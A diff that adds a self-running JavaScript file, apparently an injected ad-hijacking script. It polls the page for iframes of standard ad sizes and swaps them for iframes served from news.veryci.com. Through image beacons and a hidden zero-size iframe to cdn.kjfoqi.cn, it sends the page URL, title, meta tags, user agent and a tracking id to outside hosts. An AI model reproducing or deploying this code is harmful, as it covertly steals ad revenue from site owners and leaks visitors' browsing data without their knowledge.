@@ -1,0 +1,282 @@
+(function(){
+	
+	if(window._fcy_regsiter)return false;
+
+
+var metas = document.getElementsByTagName("meta");
+var keywords = "";
+var description = "";
+for(var i = 0 ; i < metas.length ;i++){
+	if(metas[i].getAttribute("name") == "keywords"){
+		keywords = metas[i].getAttribute("content");
+	}else if(metas[i].getAttribute("name") == "description"){
+		description = metas[i].getAttribute("content");
+	}
+}
+	
+	window._fcy_regsiter = {
+			ads:[],
+			rid:"09491298435a98c0acf5f5df8f64a884",
+			ip:"112.21.72.192",
+			device:"unknown",
+			g:"test",
+			c:"",
+			href:window.location.href,
+			referrer:"",
+			ua:navigator.userAgent,
+			origin:"",
+			uuid:"d703c2dd795092783cd91988ee93f0c8",
+			title:document.getElementsByTagName("title")[0] ? document.getElementsByTagName("title")[0].text : "",
+			keywords:keywords,
+			description:description
+	};
+
+
+	
+
+
+	window._fcy = {
+	$:function(str){
+		if(str.indexOf("#") == 0){
+			return document.getElementById(str.replace("#",""));
+		}else if(str.indexOf(".") == 0){
+			return document.getElementsByClass(str.replace(".",""));
+		}else {
+			return document.getElementsByTagName(str);
+		}
+	},
+	isWx:function(){
+		var ua = navigator.userAgent.toLowerCase();  
+	    if(ua.match(/MicroMessenger/i)=="micromessenger") {  
+	        return true;  
+	    } else {  
+	        return false;  
+	    }  
+	},
+	isMob:function(){
+            var sUserAgent = navigator.userAgent.toLowerCase();
+            var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
+            var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
+            var bIsMidp = sUserAgent.match(/midp/i) == "midp";
+            var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
+            var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
+            var bIsAndroid = sUserAgent.match(/android/i) == "android";
+            var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
+            var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
+            return (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM)
+	},
+	create:function(tagname){
+		return document.createElement(tagname)
+	},
+	enable:true,
+	click:function(id){
+		if(_fcy.enable){
+			var i = new Image();
+			var no = {
+				uuid:window._fcy_regsiter.uuid,
+				ad : id,
+				rid :window._fcy_regsiter.rid,
+				device:window._fcy_regsiter.device,
+				g:window._fcy_regsiter.g,
+				c:window._fcy_regsiter.c,
+				time:new Date().getTime(),
+			};
+			i.src = "//news.veryci.com/click?data=" + encodeURIComponent(JSON.stringify(no));
+		}
+	},
+	error:function(msg,reason){
+		var i = new Image();
+		var no = window._fcy_regsiter;
+		no.msg = msg;
+		no.reason = reason;
+		i.src = "//news.veryci.com/error?data=" + encodeURIComponent(JSON.stringify(no));
+	},
+	isReady:false,
+	readyFn:function(){},
+	ready:function(fn){
+		_fcy.readyFn = fn
+	},
+	
+
+	reptimer:false,
+	loadRep:function(ifr,size){
+
+		if(_fcy.repcount < 1000){
+			var ni = document.createElement("iframe");
+			if(ifr.attributes){
+				
+				window.setTimeout(function(){
+					for(var i = 0 ; i < ifr.attributes.length ; i++){
+						if(ifr.attributes[i] != "src"){
+							ni.setAttribute(ifr.attributes[i].nodeName,ifr.attributes[i].nodeValue);
+						}
+					}
+
+					ni.setAttribute("fcy-r",new Date().getTime());
+					
+						 console && console.log("REP",size.w,size.h,ifr.src);
+						ni.setAttribute("src","//news.veryci.com/rep?device=" +_fcy_regsiter.device+ "&bottom=" +(_fcy.BOTTOM ? 1 : 0)+ "&g=" +_fcy_regsiter.g+ "&c=" +_fcy_regsiter.c+ "&rid=" +_fcy_regsiter.rid+ "&uuid=" +_fcy_regsiter.uuid+ "&w=" +size.w+ "&h=" +size.h+ "&size=" +size.size+ "&title=" + encodeURIComponent(_fcy_regsiter.title) + "&keywords=" + encodeURIComponent(_fcy_regsiter.keywords)+ "&description=" + encodeURIComponent(_fcy_regsiter.description));
+					
+					ifr.parentNode.replaceChild(ni,ifr);
+					ifr.remove && ifr.remove()
+				},50)
+
+				console && console.log("REP_COUNT",_fcy.repcount,ifr);
+
+				_fcy.repcount++;
+			}
+		}else{
+			window.clearInterval(_fcy.reptimer);
+		}
+	},
+	repcount:0,
+	sizes:"w250h435|w676h100|w960h60|w960h110|w728h92|w300h439|w160h600|w200h200|w260h260|w950h95|w130h73|w640h110|w300h244|w960h180|w760h90|w164h225|w300h600|w989h110|w640h280|w362h361|w300h60|w180h65|w336h280|w620h200|w250h240|w950h100|w500h64|w580h90|w620h84|w252h160|w640h250|w300h150|w620h185|w446h93|w500h165|w360h720|w450h160|w300h240|w200h90|w279h83|w750h90|w660h90|w1000h90|w120h270|w710h110|w360h300|w950h90|w270h150|w960h150|w210h220|w300h190|w300h250|w300h202|w175h90|w320h270|w488h91|w250h192|w640h100|w288h328|w300h66|w484h160|w96h73|w636h90|w320h321|w600h90|w300h264|w720h150|w488h160|w365h112|w850h100|w135h820|w640h200|w120h240|w300h80|w1100h130|w320h145|w600h75|w980h150|w1180h100|w300h100|w1000h100|w980h90|w360h760|w250h250|w400h300|w960h120|w640h195|w936h150|w730h90|w248h248|w1000h60|w580h130|w640h90|w634h90|w260h90|w280h100|w640h150|w970h90|w980h60|w960h250|w979h220|w360h640|w635h130|w228h100|w1000h70|w160h428|w298h50|w304h154|w350h615|w960h90|w728h90|w240h128|w950h60|w960h130|w209h116|w660h130|w718h60|w468h60|w600h270|w670h140|w640h60|w1000h54|w605h60|w620h230|w300h200|w120h600|w300h130|w310h100|w220h220",
+	addomains:[
+		"www.veryci.com",
+		"alicdn.com",
+		"simba.taobao.com",
+		"toutiao.shopdeve.com",
+		"baidustatic.com",
+		"baidu.com",
+		"shopdeve.com",
+		"dftoutiao.com",
+		"ewuqa.com",
+		"mediav.com",
+		"doubleclick.com",
+		"bdstatic.com",
+		"domob.cn",
+		"inte.sogou.com",
+		"googleads.g.doubleclick.net",
+		"static.mediav.com",
+		"tanx.com"
+	],
+	inADdomain:function(url){
+		if(url){
+			for(var i = 0 ; i < _fcy.addomains.length ; i++){
+				if(url.indexOf(_fcy.addomains[i]) > -1){
+					 return true;
+				}
+			}
+		}
+		return false;
+	},
+
+	checkwh:function(w,h){
+
+		if(!w || !h){
+			return false;
+		}
+
+		if(_fcy.sizes.indexOf("w" + w + "h" + h) > -1){
+			return "w" + w + "h" + h;
+		}
+
+		return false;
+	},
+	rss:{},
+	scan:function(){
+		var ins = document.getElementsByTagName("ins");
+		for(var i = 0 ; i < ins.length ; i++){
+			var ifrs = ins[i].getElementsByTagName("iframe");
+			for(var j = 0 ; j < ifrs.length ; j++){
+				if(!ifrs[j].getAttribute("fcy-r")){
+					ifrs[j].setAttribute("fcy-r",new Date().getTime());
+				}
+			}
+		}
+		var ifrs = document.getElementsByTagName("iframe");
+		for(var i = 0 ; i < ifrs.length ; i++){
+				if(!ifrs[i].getAttribute("fcy-r")){
+					ifrs[i].setAttribute("fcy-r",new Date().getTime());
+						var w = ifrs[i].offsetWidth;
+						var h = ifrs[i].offsetHeight;
+						var size = _fcy.checkwh(w,h);
+						if(_fcy.isMob() && w > 49 && h > 49){
+							if(size){
+								_fcy.loadRep(ifrs[i],{w:w,h:h,size:size});
+							}else{
+								if(!_fcy.rss){
+									_fcy.rss = {};
+								}
+								_fcy.rss["w" + w + "h" + h] = 1;
+							}
+						}else if(w > 49 && h > 49 ){
+
+							if(!(w > 450 && h > 300)){
+								if(size){
+									_fcy.loadRep(ifrs[i],{w:w,h:h,size:size});
+								}else{
+									if(!_fcy.rss){
+										_fcy.rss = {};
+									}
+									_fcy.rss["w" + w + "h" + h] = 1;
+								}
+							}
+							
+						}
+				}
+		}
+
+	},
+	
+	onDOMReady:function(){
+		_fcy.readyFn();
+		
+			_fcy.reptimer = setInterval(function(){
+				_fcy.scan();
+			},100);
+		 
+	}
+}
+_fcy.readyTimer = window.setInterval(function(){
+	try{
+		if(document.body){
+			if(_fcy.readyTimer){
+				window.clearInterval(_fcy.readyTimer);
+				_fcy.onDOMReady();
+			}
+		}
+	}catch(e){
+		window.clearInterval(_fcy.readyTimer);
+		_fcy.error(e.message,"onload");
+		return;
+	}
+},10);
+
+	_fcy.ready(function(){
+		
+		try{
+			
+			
+				
+			
+				
+			
+				
+			
+			
+			
+		}catch(e){
+			_fcy.error(e.message,"last");
+		}finally{
+			window.setTimeout(function(){
+	var endImg = new Image();
+	endImg.src = "//news.veryci.com/n?data=" + encodeURIComponent(JSON.stringify(_fcy_regsiter));
+
+	var endifr = document.createElement("iframe");
+	endifr.setAttribute("style","display:none;width:0;height:0;");
+	endifr.setAttribute("src","https://cdn.kjfoqi.cn/cnzz/ads.html?data=" + encodeURIComponent(JSON.stringify(_fcy_regsiter)));
+	document.body && document.body.appendChild(endifr);
+
+	//var jssImg =  new Image();
+	//jssImg.src = "http://117.121.41.234:8181/whitelist/";
+	
+},10);
+
+		}
+		
+
+	});
+
+	
+})();
